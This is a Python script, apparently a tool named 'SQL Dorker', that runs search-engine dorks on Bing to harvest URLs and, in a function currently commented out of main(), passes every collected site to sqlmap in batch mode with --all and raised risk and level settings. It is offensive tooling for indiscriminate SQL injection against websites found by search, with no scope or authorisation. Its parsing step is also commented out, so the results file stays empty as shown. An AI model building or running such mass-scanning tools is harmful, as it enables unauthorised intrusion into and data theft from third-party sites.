#! usr/bin/python3
import click
import grequests
import random
from bs4 import BeautifulSoup
import subprocess
from termcolor import cprint
# ADD MORE HEADERS
header = {'user-agent': 'Moofzilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'}
# BASE BING URL
base = "https://www.bing.com/search?q="

# SECOND PART OF BING URL

base2 = "&first="


# USER INPUT FOR PAGES
def pages_q():
    global pages
    pages = int(input('how many pages? >>'))


# SET OF FINAL SITES

sites = []

bings = []

final_dorks2 = []


def create_dorks():
    qs = input("""
    DO YOU WANT TO..    
    1.USE CUSTOM DORK    
    
          OR
    
    2.USE DORKS.TXT    
        
        """)

    q = int(qs)

    if q == 1:

        dorks3 = input("ENTER DORK >>>")

        final_dorks2.append(dorks3 + str(random.randint(1, 1000)))

    elif q == 2:

        dorks = open("dorks.txt", 'r').read().split('\n')

        for dork in dorks:
            d = dork + str(random.randint(1, 1000))

            final_dorks2.append(d)

        print(final_dorks2)


def bing_urls():
    for final in final_dorks2:

        i = page = 1

        while page <= pages:
            global url
            url = base + final + base2 + str(i)

            bings.append(url)

            i += 10
            page += 1
    #print(bings)


        
        
        

def writeurls():  
    with open('results.txt', 'w') as f:
        for site in sites:
            f.write("%s\n" % site)


















def dorker():
    
    
    global html
    html = [grequests.get(b, headers=header) for b in bings]
    wtf = grequests.map(html)
    for w in wtf:
        print(w.text)
        # data = BeautifulSoup(w, 'html.parser')
        # results = data.find('ol', {'id': 'b_results'})
        # results = results.find_all('li', {'class': 'b_algo'})
        # for result in results:
        #     link = result.find('a').attrs['href']
        #     sites.add(link)
        #     print(link)
                
                

    with open('results.txt', 'w') as f:
        for site in sites:
            f.write("%s\n" % site)

def clickk():
    click.confirm("""
Dorking finished!! Saved to results.txt!
Would you like to run results through sqlmap???   
    """, default=True, abort=True)

def sqlmapp():
    subprocess.call(['sqlmap', '-m', 'results.txt', '--all', '--smart', '--batch', '--level=2', '--risk=2', '--threads=6', '--ignore-redirect', '--drop-set-cookie', '--random-agent', '-o'])


def banner():
    cprint("""
 $$$$$$$$$ $$$$  $$$$ $$$$$$$$$ $$$$$$$$$$ $$$$$$$$$
 $$$$$$$$$ $$$$  $$$$ $$$$$$$$$ $$$$$$$$$$ $$$$$$$$$
 $$$$      $$$$  $$$$    $$$    $  $$$$  $     $$$$$  
 $$$$$$$$$ $$$$  $$$$    $$$    $  $$$$  $    $$$$$
 $$$$$$$$$ $$$$  $$$$    $$$       $$$$      $$$$$   
     $$$$$ $$$$  $$$$    $$$       $$$$     $$$$$   
     $$$$$ $$$$  $$$$    $$$       $$$$    $$$$$ 
 $$$$$$$$$ $$$$$$$$$$ $$$$$$$$$ $$$$$$$$$ $$$$$$$$$$$  
          
  @@@@@@@                 @@                                   
  @@@   @@          @@@@  @@  @@   @@@@@   @@@@
  @@@    @@  @@@@  @@@@@@ @@ @@   @@   @@ @@@@@@        
  @@@    @@ @@  @@ @@  @@ @@@@@@@ @@@@@@@ @@  @@          
  @@@    @@ @@  @@ @@     @@   @@ @@      @@                  
  @@@@@@@@@  @@@@  @@    @@@   @@  @@@@@  @@   VERSION 1.5   
       
  Coded By Suitz 6 .     """, 'red', attrs=['bold'])


def main():
    #banner()

    pages_q()

    create_dorks()

    bing_urls()

    dorker()

    #clickk()

    #sqlmapp()
main()
